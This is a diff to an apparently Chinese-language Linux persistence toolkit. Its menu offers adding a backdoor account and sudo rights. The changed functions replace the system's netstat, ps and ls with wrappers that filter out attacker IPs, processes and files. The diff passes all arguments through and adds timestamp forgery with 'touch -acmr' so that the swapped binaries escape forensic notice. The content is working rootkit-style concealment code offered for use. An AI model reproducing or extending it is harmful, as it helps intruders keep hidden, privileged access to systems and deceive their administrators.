@@ -9,7 +9,7 @@ show() {
 ██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║     ██╔══██╗██║   ██║██║   ██║   ██║       
 ███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗██║  ██║╚██████╔╝╚██████╔╝   ██║       
 ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       
-                                                                                                      
+                                                                                                     
 请选择维持方式：
     [1] 添加后门账户
     [2] 为账户添加sudo权限
@@ -120,7 +120,7 @@ HiddenNetWork() {
     # 创建新的 netstat 文件
     {
         echo '#!/bin/bash'
-        echo "${backup_path}/.netstat \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 | grep -v -f '$hidden_ips_file' | grep -v ${backup_path}"
+        echo "${backup_path}/.netstat \$@ | grep -v -f '$hidden_ips_file' | grep -v ${backup_path}"
     } > "$netstat_path"
 
     # 设置权限
@@ -128,6 +128,8 @@ HiddenNetWork() {
         echo "错误: 设置权限失败"
         return 1
     }
+    # 设置时间戳
+    touch -acmr "${backup_file}" "${netstat_path}"
 }
 
 
@@ -162,7 +164,7 @@ HiddenProcess() {
     # 创建新的 ps 文件
     {
         echo '#!/bin/bash'
-        echo "${backup_path}/.ps \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 | grep -v -f '$hidden_processes_file' | grep -v $backup_path | grep -v '/bin/bash /usr/bin/ps'"
+        echo "${backup_path}/.ps \$@ | grep -v -f '$hidden_processes_file' | grep -v $backup_path | grep -v '/bin/bash /usr/bin/ps'"
     } > "$ps_path"
 
     # 设置权限
@@ -170,6 +172,8 @@ HiddenProcess() {
         echo "错误: 设置权限失败"
         return 1
     }
+        # 设置时间戳
+        touch -acmr "${backup_file}" "${ps_path}"
 }
 
 HiddenList() {
@@ -203,7 +207,7 @@ HiddenList() {
     # 创建新的 ls 文件
     {
         echo '#!/bin/bash'
-        echo "${backup_path}/.ls  \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 | grep -v -f '$hidden_processes_file' | grep -v $backup_path "
+        echo "${backup_path}/.ls  \$@ | grep -v -f '$hidden_processes_file' | grep -v $backup_path "
     } > "$ls_path"
 
     # 设置权限
@@ -211,6 +215,8 @@ HiddenList() {
         echo "错误: 设置权限失败"
         return 1
     }
+        # 设置时间戳
+    touch -acmr "${backup_file}" "${ls_path}"
 }
 
 
